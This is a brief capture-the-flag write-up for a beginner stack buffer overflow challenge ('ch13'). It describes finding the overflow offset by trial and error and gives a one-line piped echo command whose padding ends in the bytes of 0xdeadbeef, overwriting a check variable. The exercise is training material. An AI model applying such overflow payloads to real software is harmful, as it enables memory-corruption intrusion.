# Writeup

Initially I tried to overflow as much as possible and seeing which string the check finally became from my input.
Trying things like abcdefg all the way to Z t o find out at which character does it start overflowing to the check. 

Then I knew that I had to input my stdin as a piped input, since it's hard to just type ASCII strings into my terminal. So I used the command

```sh
echo -e -n '0xasdfafwlkfgrmaeorgnaeporgnapeorgmapoer\xef\xbe\xad\xde' | ./ch13
```

to make the check complete.
